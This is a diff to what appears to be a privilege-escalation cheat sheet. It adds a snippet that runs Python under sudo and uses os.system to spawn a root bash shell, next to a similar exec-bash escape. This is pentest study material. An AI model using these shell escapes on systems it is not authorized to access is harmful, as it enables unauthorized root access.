@@ -145,6 +145,12 @@ exec "/bin/bash";
 ctr-d
 ```
 
+```
+sudo python
+import os
+os.system("/bin/bash")
+```
+
 ### Software vulnerabilites
 
 Software vulnerabilites can lead to priv-esc, like vulnerabiliteis in:
